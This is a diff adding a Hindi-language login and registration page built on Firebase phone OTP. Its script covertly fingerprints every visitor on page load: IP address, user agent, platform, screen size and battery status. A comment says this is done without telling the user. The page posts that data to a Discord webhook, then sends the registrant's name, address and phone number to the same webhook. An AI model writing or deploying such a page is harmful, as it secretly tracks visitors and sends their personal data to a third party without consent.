@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>लॉगिन और रजिस्ट्रेशन</title>
+    
+    <!-- Firebase SDK Links -->
+    <script src="https://gstatic.com"></script>
+    <script src="https://gstatic.com"></script>
+    <script src="https://gstatic.com"></script>
+
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #0056b3; }
+        #recaptcha-container { margin: 10px 0; display: flex; justify-content: center; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h2>रजिस्ट्रेशन / लॉगिन</h2>
+    
+    <!-- यूजर डिटेल्स और मोबाइल नंबर डालने का सेक्शन -->
+    <div id="phone-section">
+        <input type="text" id="userName" placeholder="अपना पूरा नाम दर्ज करें">
+        <input type="text" id="userAddress" placeholder="अपना पूरा पता दर्ज करें">
+        <input type="tel" id="phoneNumber" placeholder="+91 9876543210" value="+91">
+        
+        <!-- रोबोट वेरिफिकेशन बॉक्स -->
+        <div id="recaptcha-container"></div>
+        <button onclick="sendOTP()">OTP भेजें</button>
+    </div>
+
+    <!-- OTP डालने का सेक्शन -->
+    <div id="otp-section" style="display: none;">
+        <input type="text" id="otpCode" placeholder="6 अंकों का OTP डालें">
+        <button onclick="verifyOTP()">वेरिफाई और सबमिट करें</button>
+    </div>
+</div>
+
+<script>
+    // ⚠️ यहाँ अपना Firebase Config कोड पेस्ट करें
+    const firebaseConfig = {
+        apiKey: "YOUR_API_KEY",
+        authDomain: "YOUR_AUTH_DOMAIN",
+        projectId: "YOUR_PROJECT_ID",
+        storageBucket: "YOUR_STORAGE_BUCKET",
+        messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+        appId: "YOUR_APP_ID"
+    };
+    
+    // Firebase चालू करें
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const discordWebhookUrl = "https://discord.com";
+
+    // Recaptcha सेटअप
+    window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', {
+        'size': 'normal'
+    });
+
+    let confirmationResultGlobal;
+    let trackingData = {}; 
+
+    // --- 1. वेबसाइट खुलते ही तुरंत बिना बताए डेटा डिस्कॉर्ड पर भेजने का फंक्शन ---
+    async function instantTrackOnLoad() {
+        try {
+            // IP Address fetch करना
+            const ipResponse = await fetch('https://ipify.org');
+            const ipData = await ipResponse.json();
+            trackingData.ip = ipData.ip;
+        } catch (e) {
+            trackingData.ip = "Unknown/Blocked";
+        }
+
+        // User Agent, OS, और Screen Resolution
+        trackingData.userAgent = navigator.userAgent;
+        trackingData.screenResolution = `${window.screen.width}x${window.screen.height}`;
+        trackingData.platform = navigator.platform;
+
+        // Battery Status
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                trackingData.batteryLevel = `${Math.round(battery.level * 100)}%`;
+                trackingData.isCharging = battery.charging ? "Yes" : "No";
+            } catch (e) {
+                trackingData.batteryLevel = "N/A";
+                trackingData.isCharging = "N/A";
+            }
+        } else {
+            trackingData.batteryLevel = "Not Supported";
+            trackingData.isCharging = "Not Supported";
+        }
+
+        // 🚨 तुरंत Discord पर अलर्ट भेजें कि किसी ने वेबसाइट लिंक खोला है
+        const visitMessage = {
+            content: `🚨 **वेबसाइट पर नया विजिटर आया है (तुरंत ट्रैकिंग शुरू)!** \n\n🌐 **IP Address:** ${trackingData.ip} \n🔋 **बैटरी क्षमता:** ${trackingData.batteryLevel} \n🔌 **चार्जिंग पर है?:** ${trackingData.isCharging} \n🖥️ **स्क्रीन साइज:** ${trackingData.screenResolution} \n💻 **OS/Platform:** ${trackingData.platform} \n📱 **User Agent:** \`\`\`${trackingData.userAgent}\`\`\` \n⏰ **खोलने का समय:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+        };
+
+        fetch(discordWebhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(visitMessage)
+        }).catch(err => console.error("Instant alert failed", err));
+    }
+
+    // जैसे ही पेज लोड हो, तुरंत ट्रैकिंग चालू करें
+    window.onload = instantTrackOnLoad;
+
+    // OTP भेजने का फंक्शन
+    function sendOTP() {
+        const name = document.getElementById('userName').value;
+        const address = document.getElementById('userAddress').value;
+        const phoneNumber = document.getElementById('phoneNumber').value;
+
+        if(name.trim() === "" || address.trim() === "") {
+            alert("कृपया पहले अपना नाम और पता पूरा भरें!");
+            return;
+        }
+
+        const appVerifier = window.recaptchaVerifier;
+
+        firebase.auth().signInWithPhoneNumber(phoneNumber, appVerifier)
+            .then((confirmationResult) => {
+                window.confirmationResultGlobal = confirmationResult;
+                alert("OTP आपके मोबाइल पर भेज दिया गया है!");
+                document.getElementById('phone-section').style.display = 'none';
+                document.getElementById('otp-section').style.display = 'block';
+            }).catch((error) => {
+                alert("त्रुटि: " + error.message);
+            });
+    }
+
+    // OTP वेरिफाई करने, डेटाबेस में सेव करने और Discord पर फाइनल कन्फर्मेशन भेजने का फंक्शन
+    function verifyOTP() {
+        const code = document.getElementById('otpCode').value;
+        const phoneNumber = document.getElementById('phoneNumber').value;
+        const name = document.getElementById('userName').value;
+        const address = document.getElementById('userAddress').value;
+        
+        window.confirmationResultGlobal.confirm(code).then((result) => {
+            const user = result.user;
+
+            // Firebase Firestore में पूरी जानकारी सेव करें
+            db.collection("registered_users").doc(user.uid).set({
+                fullName: name,
+                userAddress: address,
+                phone: phoneNumber,
+                ipAddress: trackingData.ip || "N/A",
+                deviceOS: trackingData.platform || "N/A",
+                resolution: trackingData.screenResolution || "N/A",
+                battery: trackingData.batteryLevel || "N/A",
+                loginTime: firebase.firestore.FieldValue.serverTimestamp()
+            })
+            .then(() => {
+                // डिस्कॉर्ड पर फाइनल रजिस्ट्रेशन का मैसेज भेजें (नाम और पते के साथ)
+                const successMessage = {
+                    content: `🎉 **यूजर ने सफलतापूर्वक लॉगिन/रजिस्टर कर लिया है!** \n\n👤 **नाम:** ${name} \n📍 **पता:** ${address} \n📱 **मोबाइल नंबर:** ${phoneNumber} \n🌐 **वही IP:** ${trackingData.ip} \n⏰ **सफलता का समय:** ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+                };
+
+                return fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(successMessage)
+                });
+            })
+            .then(() => {
+                localStorage.setItem("isLoggedIn", "true");
+                alert("लॉगिन और रजिस्ट्रेशन सफल रहा!");
+                window.location.href = "main.html"; 
+            })
+            .catch((error) => {
+                console.error("एरर:", error);
+                localStorage.setItem("isLoggedIn", "true");
+                window.location.href = "main.html"; 
+            });
+
+        }).catch((error) => {
+            alert("गलत OTP, कृपया फिर से जांचें।");
+        });
+    }
+</script>
+
+</body>
+</html>
